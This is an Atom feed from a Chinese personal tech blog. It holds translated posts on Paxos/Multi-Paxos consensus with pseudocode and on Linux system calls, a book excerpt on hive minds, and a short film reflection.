<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Diting0x</title>
  <subtitle>Keep Me Alive</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2016-04-28T05:34:03.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Diting0x</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深入理解Paxos算法(一)</title>
    <link href="http://yoursite.com/blog/2016/04/28/understand-paxos1/"/>
    <id>http://yoursite.com/blog/2016/04/28/understand-paxos1/</id>
    <published>2016-04-28T05:31:00.000Z</published>
    <updated>2016-04-28T05:34:03.000Z</updated>
    
    <content type="html"></content>
    
    <summary type="html">
    
    </summary>
    
      <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
      <category term="Distributed" scheme="http://yoursite.com/tags/Distributed/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Paxos/Mutil-paxos 算法</title>
    <link href="http://yoursite.com/blog/2016/04/27/paxos-mutilpaxos/"/>
    <id>http://yoursite.com/blog/2016/04/27/paxos-mutilpaxos/</id>
    <published>2016-04-28T00:48:54.000Z</published>
    <updated>2016-04-28T15:31:31.000Z</updated>
    
    <content type="html">&lt;p&gt;在前几篇博客中，讨论了我在伯克利最后一学期修的分布式系统编程课程中的内容。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt; 
&lt;p&gt;那时我参与的项目太酷了- 我们组一步步完成了从quorum KVS到分布式锁管理，又实现了Multi-paxos算法作为我们最终提交的项目。这篇博客，我会从普通的Paxos算法说起。&lt;/p&gt;
&lt;p&gt;简单来说，Paxos是将一组节点在单个值上达成一致的协议(严格来说，是指一个协议簇，这是 &lt;a href=&quot;https://en.wikipedia.org/wiki/Paxos_\(computer_science&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;维基百科&lt;/a&gt; 上的说法)&lt;/p&gt;
&lt;h3 id=&quot;Paxos算法为什么重要？&quot;&gt;&lt;a href=&quot;#Paxos算法为什么重要？&quot; class=&quot;headerlink&quot; title=&quot;Paxos算法为什么重要？&quot;&gt;&lt;/a&gt;Paxos算法为什么重要？&lt;/h3&gt;&lt;p&gt;如果有个固定的的master节点，master节点就可以自己决策并提案值，让其它节点跟着使用这个值就行，那Paxos算法就没有任何用武之地了。倘若决策者的选举失败（有时就会这样），有两个节点提案值呢？&lt;/p&gt;
&lt;p&gt;Paxos算法能保证在所有提案的值中选出一个唯一的值。当你想在分布式系统中的一系列值中做决策时，或者说，在这一系列的值中决策出一致的顺序，Paxos算法就派上用场了。&lt;/p&gt;
&lt;p&gt;像&lt;a href=&quot;https://ayende.com/blog/4496/paxos-enlightment&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ayende Rahien&lt;/a&gt;描述的那样，如果这些值是指一些事件，那在一个集群中所有的机器都能保持相同的状态或者状态的子集。&lt;/p&gt;
&lt;h3 id=&quot;Paxos-算法&quot;&gt;&lt;a href=&quot;#Paxos-算法&quot; class=&quot;headerlink&quot; title=&quot;Paxos 算法&quot;&gt;&lt;/a&gt;Paxos 算法&lt;/h3&gt;&lt;p&gt;Paxos算法分两个阶段进行，准备阶段(Prepare Phase）与批准阶段（Accept Phase)。&lt;/p&gt;
&lt;p&gt;声明：下面章节的一些用词部分来源于Leslie Lamport的论文： &lt;a href=&quot;http://research.microsoft.com/en-us/um/people/lamport/pubs/paxos-%20simple.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Paxo Made Simple&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&quot;准备阶段&quot;&gt;&lt;a href=&quot;#准备阶段&quot; class=&quot;headerlink&quot; title=&quot;准备阶段&quot;&gt;&lt;/a&gt;准备阶段&lt;/h4&gt;&lt;p&gt;在准备阶段，提案者（proposor)选出一个提案编号 &lt;code&gt;n&lt;/code&gt; (此编号比提案者之前发送出的任何一个 编号都要大，也与任何其他提案者的编号 不同，将在下面详细讨论)，然后发送一个 &lt;code&gt;PREPARE&lt;/code&gt; 请求给批准者的多数派。&lt;/p&gt;
&lt;p&gt;对批准者（acceptor)来说，如果收到的 &lt;code&gt;PREPARE&lt;/code&gt; 请求中的提案编号 &lt;code&gt;n&lt;/code&gt; 比它之前收到的任何提案编号都要大，就会响应一个“承诺”  (promise)，指出之后不会接收任何一个比这个提案编号要小的编号,以及已经收到过的最大提案编号(如果有的话).&lt;/p&gt;
&lt;p&gt;开始听起来有点困惑了？&lt;/p&gt;
&lt;p&gt;在真正理解前我也读了好几遍，再看看下面的伪代码也许会有所帮助。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Proposer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; acceptor in acceptors&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  send :prepare_req, next_n()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Acceptor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.n &amp;gt; highest_proposed_n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  highest_proposed_n = req.n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  reply :prepare_resp, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    :n =&amp;gt; highest_acc.n,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    :value =&amp;gt; highest_acc.value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;批准阶段&quot;&gt;&lt;a href=&quot;#批准阶段&quot; class=&quot;headerlink&quot; title=&quot;批准阶段&quot;&gt;&lt;/a&gt;批准阶段&lt;/h4&gt;&lt;p&gt;当提案者收到批准者中多数派对 &lt;code&gt;PREPARE&lt;/code&gt; 请求的响应后，给批准者发送一个含有值 &lt;code&gt;v&lt;/code&gt; 的 &lt;code&gt;ACCEPT&lt;/code&gt; 信号，&lt;code&gt;v&lt;/code&gt; 是收到的响应中最高提案编号中的值，当响应中没有任何批准的值时，&lt;code&gt;v&lt;/code&gt; 可以是任意值。&lt;/p&gt;
&lt;p&gt;当批准者收到 &lt;code&gt;ACCEPT&lt;/code&gt; 请求时，总会接收这个请求，除非它已经在准备阶段承诺过不再接收任何请求。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Proposer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; acceptor in acceptors&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  send :accept_req, responses.argmax &amp;#123; |i| i.n &amp;#125;.value &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Acceptor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.n &amp;gt;= highest_proposed_n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  highest_acc = &amp;#123;:n =&amp;gt; req.n, :value =&amp;gt; req.value&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  reply :accept_resp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Mutil-Paxos-算法&quot;&gt;&lt;a href=&quot;#Mutil-Paxos-算法&quot; class=&quot;headerlink&quot; title=&quot;Mutil-Paxos 算法&quot;&gt;&lt;/a&gt;Mutil-Paxos 算法&lt;/h3&gt;&lt;p&gt;上面所讲的是 Paxos 算法。那 Multi-paxos 算法是如何工作的呢？&lt;/p&gt;
&lt;p&gt;前面提到，Paxos 算法最主要的应用在于，能让许多参与者在一系列列数值中做出决策。当Paxos算法结束运行一轮后，会生成一个提案值 &lt;code&gt;v&lt;/code&gt; ，要决策出一系列的提案值来，最简单的方法就是多次运行 Paxos 算法，对不对？&lt;/p&gt;
&lt;p&gt;实际上这种情况可以对 Paxos 算法进行优化： 设定一个固定的决策者，可以用来跳过准备阶段。假定这种决策关系能够保持”粘性”，就没必要继续发出提案编号—第一个被发送的提案号始终不会被覆盖，因为这时只有一个决策者。&lt;/p&gt;
&lt;p&gt;因此，我们只需要运行一次准备阶段就够了。在 Paxos 算法接下来的几轮中，我们只需要发送 &lt;code&gt;ACCEPT&lt;/code&gt; 消息，附带一个在原始 &lt;code&gt;PREPARE&lt;/code&gt; 请求中用过的提案编号 &lt;code&gt;n&lt;/code&gt; ,和一个额外的参数来表示我们正在运行的轮数序列号。最坏的情况不过是决策关系不是固定的(或者说不是唯一的),这时我们也不必担心，因为算法会自动降级到普通的Paxos算法中(每一轮过程中都有准备阶段和批准阶段）。好酷！&lt;/p&gt;
&lt;h3 id=&quot;其它考虑&quot;&gt;&lt;a href=&quot;#其它考虑&quot; class=&quot;headerlink&quot; title=&quot;其它考虑&quot;&gt;&lt;/a&gt;其它考虑&lt;/h3&gt;&lt;h4 id=&quot;永久存储&quot;&gt;&lt;a href=&quot;#永久存储&quot; class=&quot;headerlink&quot; title=&quot;永久存储&quot;&gt;&lt;/a&gt;永久存储&lt;/h4&gt;&lt;p&gt;系统必须保证一些数据能永久存储，以防能从失效中恢复。&lt;br&gt;尤其是，批准者需要记住它们承诺过要响应哪个 &lt;code&gt;PREPARE&lt;/code&gt; 请求以及它们响应过的 &lt;code&gt;ACCEPT&lt;/code&gt; 请求，这样做是为了决策出要承诺哪个提案并能传递一些必要的信息反馈给此提案。&lt;/p&gt;
&lt;h4 id=&quot;唯一的提案编号-n&quot;&gt;&lt;a href=&quot;#唯一的提案编号-n&quot; class=&quot;headerlink&quot; title=&quot;唯一的提案编号 n&quot;&gt;&lt;/a&gt;唯一的提案编号 &lt;code&gt;n&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;为了能让算法正常工作，每个提案者必须递增地增加提案编号 &lt;code&gt;n&lt;/code&gt;，&lt;code&gt;n&lt;/code&gt; 必须不同于其它任何提案者的编号.&lt;/p&gt;
&lt;p&gt;为了满足这个条件，我们为每个提案者分配一个互斥的数值集合，并让它们只能从自己的集合中选取编号（比如说，给每个节点分配一个单独的素数，它们可以选择素数的不同倍数作为一个集合）&lt;/p&gt;
&lt;p&gt;或者，我们也可以设定参与者成员的静态属性，为每个节点分配一个从0到 &lt;code&gt;k&lt;/code&gt; 之间的唯一数值&lt;code&gt;i&lt;/code&gt;，&lt;code&gt;k&lt;/code&gt; 是参与者的总数，&lt;code&gt;n=i+(k*轮数)&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h3&gt;&lt;p&gt;长话短说: Paxos 算法的目标是能让集群中的机器在一个提案值上最终达到统一（或者更有用的情况是，能为一系列数值决策出一致的顺序）。Multi-paxos 算法是对连续许多轮执行 Paxos 算法的一种优化，如果你设定了一个决策者，就可以跳过其中的一个阶段。&lt;/p&gt;
&lt;p&gt;希望这篇博客能对你有用。我不是这个领域的专家，所以希望能听到更多的评论与修正。&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;译文，仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原英文地址：&lt;a href=&quot;http://amberonrails.com/paxosmulti-paxos-algorithm/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://amberonrails.com/paxosmulti-paxos-algorithm/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/27/paxos-mutilpaxos/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/27/paxos-mutilpaxos/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt; &amp;amp;&amp;amp;  &lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先生&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在前几篇博客中，讨论了我在伯克利最后一学期修的分布式系统编程课程中的内容。&lt;/p&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
      <category term="Distributed" scheme="http://yoursite.com/tags/Distributed/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>新生物文明与蜂群思维</title>
    <link href="http://yoursite.com/blog/2016/04/26/shikongnote1/"/>
    <id>http://yoursite.com/blog/2016/04/26/shikongnote1/</id>
    <published>2016-04-26T16:56:01.000Z</published>
    <updated>2016-04-26T16:59:08.000Z</updated>
    
    <content type="html">&lt;p&gt;新生物文明&lt;/p&gt;
&lt;p&gt;机器，正在生物化；而生物，正在工程化。&lt;br&gt;这种趋势正验证着某些古老的隐喻–将机器比喻为生物，将生物比喻为机器。哪些比喻由来已久，古老到第一台机器诞生之时。如今，哪些久远的隐喻不再只是诗意的遐想，它们正在变为现实–一种积极有益的现实。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;由于我们自己创造的这个世界变得过于负责，我们不得不求助于自然世界以了解管理它的方法。这也就意味着，想要保证一切正常运转，我们最终制造出来的环境越机械化，可能越需要生物化。我们的未来是技术性的，但这并不意味着未来世界一定会是灰色冰冷的钢铁世界。相反，我们的技术所引导的未来，朝向的正是一种新生物文明。&lt;/p&gt;
&lt;p&gt;生物逻辑的胜利&lt;/p&gt;
&lt;p&gt;[机械]与[生命]这两个词的含义在不断延生，直到某一天，所有结构复杂的东西都被看作是机器，而所有能够自维持的机器都被看作是有生命的。&lt;/p&gt;
&lt;p&gt;学会向我们的创造物低头&lt;/p&gt;
&lt;p&gt;人造世界就像天然世界一样，很快就会具有自制力、适应力以及创造力，也随之失去我们的控制。但在我看来，这却是个最美妙的结局。&lt;/p&gt;
&lt;p&gt;蜂群思维  &lt;/p&gt;
&lt;p&gt;蜂群是彻底的母权制，而且是姐妹关系：除了少数无用的雄峰，所有的蜜蜂都是雌性姐妹。蜂群曾经如同日蚀一样神秘、一样深不可测。&lt;/p&gt;
&lt;p&gt;蜂群的灵魂在哪里，它在何处主流？&lt;br&gt;这里由谁统治，由谁发布命令，由谁遇见未来？&lt;/p&gt;
&lt;p&gt;这是一个白痴的选举大厅，由白痴选举白痴，其产生的效果却极为惊人。这是民主制度的精髓，是彻底的分布式管理。&lt;/p&gt;
&lt;p&gt;活系统的普遍规律：底层及的存在无法推断出高层级的负载型。不管是计算机还是大脑，也不管事哪一种方法–数学、物理或哲学–如果不实际运行它，就无法解释融于个体部分的涌现模式。只有实际存在的蜂群才能解释单个蜜蜂体内是否融合着蜂群特性。&lt;/p&gt;
&lt;p&gt;记忆是高度重建的。在记忆中进行抽取，需要从数目庞大的事件中挑选出什么是重要的，什么是不重要的，强调重要的东西，忽略不重要的东西。这种选择的过程实际上就是感知。&lt;/p&gt;
&lt;p&gt;-摘录自《失控》&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;新生物文明&lt;/p&gt;
&lt;p&gt;机器，正在生物化；而生物，正在工程化。&lt;br&gt;这种趋势正验证着某些古老的隐喻–将机器比喻为生物，将生物比喻为机器。哪些比喻由来已久，古老到第一台机器诞生之时。如今，哪些久远的隐喻不再只是诗意的遐想，它们正在变为现实–一种积极有益的现实。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://yoursite.com/categories/Misc/"/>
    
    
  </entry>
  
  <entry>
    <title>电影无人区的思考</title>
    <link href="http://yoursite.com/blog/2016/04/22/wurenqu/"/>
    <id>http://yoursite.com/blog/2016/04/22/wurenqu/</id>
    <published>2016-04-22T06:39:20.000Z</published>
    <updated>2016-04-26T19:29:28.000Z</updated>
    
    <content type="html">&lt;p&gt;从大学起就听说过宁浩的无人区，那时候还是2009年，就期待着这部想像中的‘黑色幽默’。可是时间一晃，便迟到了四年，也早耗费了我整个大学时光。不知不觉，随我到了北京，13年上映，那时便立马看了首映。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;今天是2016年，又一个三年，这是我第三次看这部电影，而这时候，却身处美国的一个中西部农村。这种黑色、公路片对我一直有巨大的诱惑力，之前看过《两杆大烟枪》、《老无所依》、《不准掉头》、《偷拐抢骗》、《杀手没有假期》，还有宁浩的疯狂系列，都非常喜欢。&lt;/p&gt;
&lt;p&gt;黑色让人沉思，公路让人浮想联翩。想找个假期能狂奔在美国西部的公路上，没有尽头，去体验那种放肆。&lt;/p&gt;
&lt;p&gt;无人区，这里没有人，只有动物。&lt;br&gt;一个没有人的区域，没有法律、没有道德、没有人情，只有生物本能的生与死、苦与乐。&lt;br&gt;而人与动物的区别，就是，人会用火。&lt;br&gt;火可以用来取暖，炙热情感。就像电影中的潘肖，牺牲自己也要让她把这个故事带出去。&lt;/p&gt;
&lt;p&gt;好温馨的表达，人会用火。多点燃你心中的火，多温暖你身边的人。&lt;/p&gt;
&lt;p&gt;突然用电影来表达这些，实在是太不和谐。&lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;从大学起就听说过宁浩的无人区，那时候还是2009年，就期待着这部想像中的‘黑色幽默’。可是时间一晃，便迟到了四年，也早耗费了我整个大学时光。不知不觉，随我到了北京，13年上映，那时便立马看了首映。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://yoursite.com/categories/Misc/"/>
    
    
      <category term="Life" scheme="http://yoursite.com/tags/Life/"/>
    
      <category term="Movie" scheme="http://yoursite.com/tags/Movie/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统调用权威指南</title>
    <link href="http://yoursite.com/blog/2016/04/08/linux-syscalls/"/>
    <id>http://yoursite.com/blog/2016/04/08/linux-syscalls/</id>
    <published>2016-04-08T21:08:08.000Z</published>
    <updated>2016-04-26T17:37:48.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;长话短说（Too long;Don’t read)&lt;/li&gt;
&lt;li&gt;什么是系统调用&lt;/li&gt;
&lt;li&gt;准备知识&lt;ul&gt;
&lt;li&gt;硬件与软件&lt;/li&gt;
&lt;li&gt;用户程序，内核与CPU特权级&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;li&gt;特殊模块寄存器&lt;/li&gt;
&lt;li&gt;编写汇编代码触发系统调用不是个好主意&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;传统系统调用&lt;ul&gt;
&lt;li&gt;自己写汇编代码使用传统系统调用&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;int $0x80&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iret&lt;/code&gt;: 从传统系统调用返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;快速系统调用&lt;ul&gt;
&lt;li&gt;32位快速系统调用&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sysenter/sysexit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;内幕&lt;/li&gt;
&lt;li&gt;自己写汇编代码使用&lt;code&gt;sysenter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;sysenter&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sysexit&lt;/code&gt;: 从&lt;code&gt;sysenter&lt;/code&gt;中返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;64位快速系统调用&lt;ul&gt;
&lt;li&gt;&lt;code&gt;syscall/sysret&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自己写汇编代码使用syscall&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;syscall&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;sysret: 从syscall中返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;syscall(2)：半手动调用syscall&lt;ul&gt;
&lt;li&gt;glibc &lt;code&gt;syscall&lt;/code&gt;封装器内幕&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;虚拟系统调用&lt;ul&gt;
&lt;li&gt;内核中的vDSO&lt;/li&gt;
&lt;li&gt;在内存中定位vDSO&lt;/li&gt;
&lt;li&gt;glibc中的vDSO&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;glibc&lt;/code&gt;系统调用封装器&lt;/li&gt;
&lt;li&gt;重要的syscall相关bugs&lt;ul&gt;
&lt;li&gt;CVE-2010-3301&lt;/li&gt;
&lt;li&gt;Android &lt;code&gt;sysenter&lt;/code&gt; ABI 破坏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;结论&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;长话短说-Too-long-Don’t-read&quot;&gt;&lt;a href=&quot;#长话短说-Too-long-Don’t-read&quot; class=&quot;headerlink&quot; title=&quot;长话短说(Too long; Don’t read)&quot;&gt;&lt;/a&gt;长话短说(Too long; Don’t read)&lt;/h2&gt;&lt;p&gt;文章解释了Linux程序在内核中是如何调用函数的。&lt;/p&gt;
&lt;p&gt;读完你可以知道：触发系统调用的不同方法，如何编写汇编代码触发系统调用(含代码样例), 内核执行系统调用的入口，内核从系统调用返回的出口，glibc封装器，相关bugs，还有更多，更多。&lt;/p&gt;
&lt;h2 id=&quot;什么是系统调用？&quot;&gt;&lt;a href=&quot;#什么是系统调用？&quot; class=&quot;headerlink&quot; title=&quot;什么是系统调用？&quot;&gt;&lt;/a&gt;什么是系统调用？&lt;/h2&gt;&lt;p&gt;当你运行的程序调用 open,fork,read,write（以及其它类似的函数)时,就会触发系统调用。&lt;/p&gt;
&lt;p&gt;系统调用描述的是用户程序进入内核后执行的任务。用户程序利用系统调用能执行许多操作：创建进程、网络、文件以及I/O操作等。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man2/syscalls.2.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;man page for syscalls(2)&lt;/a&gt; 列出了全部系统调用。&lt;/p&gt;
&lt;p&gt;用户程序可以通过不同的方式执行系统调用，不同CPU架构中，底层执行系统调用的指令也有所不同。&lt;/p&gt;
&lt;p&gt;作为应用程序开发者，不必刻意去考虑系统调用是如何执行的。你只需要简单的加上合适的头文件，像调用普通函数一样就可以使用系统调用了。&lt;/p&gt;
&lt;p&gt;glibc提供了封装代码将底层抽象，把你传递的参数放置好之后开始进入内核。&lt;/p&gt;
&lt;p&gt;在深入理解系统调用执行的细节之前，我们需要定义一些术语，再谈一谈后面要用到的核心知识点。&lt;/p&gt;
&lt;h2 id=&quot;准备知识&quot;&gt;&lt;a href=&quot;#准备知识&quot; class=&quot;headerlink&quot; title=&quot;准备知识&quot;&gt;&lt;/a&gt;准备知识&lt;/h2&gt;&lt;h3 id=&quot;硬件与软件&quot;&gt;&lt;a href=&quot;#硬件与软件&quot; class=&quot;headerlink&quot; title=&quot;硬件与软件&quot;&gt;&lt;/a&gt;硬件与软件&lt;/h3&gt;&lt;p&gt;这篇博客作以下假设：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你在使用32位、64位Intel或AMD CPU. 文中提到的方法可能对那些使用其它系统的人同样有效，但列出的代码都是依赖CPU的。&lt;/li&gt;
&lt;li&gt;你感兴趣的是Linux kernel 3.13.0. 其它的内核版本类似，但实际的代码行号，代码架构以及文件路径会有所不同。文中也提供了3.13.0内核源代码的github链接。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;你感兴趣的是&lt;code&gt;glibc&lt;/code&gt;，或者由&lt;code&gt;glibc&lt;/code&gt;衍生的其它libc实现(比如&lt;code&gt;eglibc&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;文中提到的x86-64指的是基于x86架构的64位Intel和AMD处理器。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;用户程序，内核与CPU特权级&quot;&gt;&lt;a href=&quot;#用户程序，内核与CPU特权级&quot; class=&quot;headerlink&quot; title=&quot;用户程序，内核与CPU特权级&quot;&gt;&lt;/a&gt;用户程序，内核与CPU特权级&lt;/h3&gt;&lt;p&gt;用户程序(如编辑器、终端、ssh进程等)需要与内核交互，内核才能代表用户程序执行一些其不能执行的操作。&lt;/p&gt;
&lt;p&gt;举个例子，如果一个用户程序需要执行一些I/O操作(open,read,write等)或者修改自身的地址空间(mmap,sbrk等)，必须要通知内核才能代表其自身完成这些操作。&lt;/p&gt;
&lt;p&gt;那么又是什么阻碍了用户程序自身执行这些操作呢？&lt;/p&gt;
&lt;p&gt;x86-64处理器引入了特权级的概念。特权级是个复杂的话题，需要另写博文详述了。当然，本文重点不在此，因此将特权级的概念简化如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;特权级实现了访问控制。当前特权级决定了哪些CPU指令和I/O操作能被执行。&lt;/li&gt;
&lt;li&gt;内核运行在最高特权级，称为“Ring 0”；用户程序运行在最低特权级,称为”Ring 3”.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;用户程序要执行特权操作，必须经历特权级转变的过程(从”Ring 3”到“Ring 0”),才能让内核来执行这些操作。&lt;/p&gt;
